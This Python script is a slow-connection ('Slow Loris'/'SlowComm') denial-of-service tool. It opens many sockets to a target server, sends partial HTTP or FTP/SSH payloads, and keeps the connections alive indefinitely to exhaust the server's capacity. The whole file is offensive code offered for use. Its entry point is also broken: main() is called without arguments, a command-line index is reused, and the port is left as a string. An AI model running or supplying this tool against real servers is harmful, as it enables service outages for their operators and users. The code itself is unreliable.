#!/usr/bin/env python3

import argparse
import threading
import socket
import random
import time
import sys
import os
import string

# socket initiation for SlowComm attack ------------------------------------------------------------------------------------------
def init_socket_C(ip, port, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((ip, port))
    s.send(payload)
    return s


# Slowcomm attack ----------------------------------------------------------------------------------------------------------------
def slowcomm(ip, socket_count, port, timeout, payload):
    print("IP: {}".format(ip))
    print("Port: {}".format(port))
    print("Timeout: {}".format(timeout))
    print("Payload: {}".format(payload))
    print("Slowcomm - Attacking {} with {} sockets".format(ip, socket_count))
    # ------------------------------------------------------------------------
    list_of_sockets = []
    print("Setting up the sockets...")
    for setsocket in range(socket_count):
        try:
            print(f"Creating socket number {setsocket}")
            s = init_socket_C(ip, port, payload)
        except socket.error:
            break
        list_of_sockets.append(s)

    if socket_count != len(list_of_sockets):
        print(f"\nServer could handle {len(list_of_sockets)} only")
    else:
        print(f"\n{len(list_of_sockets)} sockets succesfully created")

    i = 0
    print("\n")
    while True:
        list_of_sockets_ORIGINAL = list(list_of_sockets)
        print("Sending \"keep-alive\" payload...")
        for s in list(list_of_sockets_ORIGINAL):
            try:
                s.send(''.join(random.choice(string.ascii_lowercase) for i in range(1)).encode("utf-8"))
            except socket.error:
                print("Recreating socket...")
                list_of_sockets.remove(s)
                s_new = init_socket_C(ip, port, payload)
                if s_new:
                    list_of_sockets.append(s_new)
                    i = i + 1
        print(f"-> Recreated sockets: {i}")
        print(f"Total number of active sockets: {len(list_of_sockets)}")
        i = 0
        print(f"\nSleep - using Timeout {timeout} seconds")
        time.sleep(timeout)


# main ---------------------------------------------------------------------------------------------------------------------------
def main(attack, ip, port, timeout, connection,payload):

    # payload set according to ports, services and attacks
    if payload=="none":
        if port == 80:
            if attack == "C":
                payload = f"HEAD / HTTP/1.1\r\n".encode("utf-8")
            else:
                print("You didn't enter appropriate parameters")
                exit()
        elif port == 21 or port == 22:
            if attack == "C":
                payload = f"USER {''.join(random.choice(string.ascii_lowercase) for i in range(5))}".encode("utf-8")
            else:
                payload = f"USER {''.join(random.choice(string.ascii_lowercase) for i in range(5))}\r\n".encode("utf-8")
                keep_alive = payload
    # thread and timeout set
    if attack == "C":
        # timeout for the break between sending next requests for Slowcomm
        if timeout == 0:
            timeout = 0
        else:
            timeout = timeout

    # initializing attacks according to entered parameters
    if attack == "C":
        slowcomm(ip, connection, port, timeout, payload)


if __name__ == "__main__":
    try:
        attack = sys.argv[1]
        ip = sys.argv[2]
        port = sys.argv[3]
        timeout = int(sys.argv[3])
        timer = int(sys.argv[4])
    except:
        desc = """{
        "description": "Slow Loris",
        "params": [
            {
                "label": "IP address",
                "description":"IP Address of the target",
                "type":"string",
                "default": "192.168.1.1"
            },
            {
                "label": "Port",
                "description":"Port",
                "type":"string",
                "default": "80"
            },
            {
                "label": "Socket count",
                "description":"Socket count",
                "type":"numeric",
                "default": 5
            },
            {
                "label": "Timer",
                "description":"Timer",
                "type":"string",
                "default": 1
            }
        ]
    }"""
        print(desc)  # list all required parameters
        sys.exit(64)
    main()
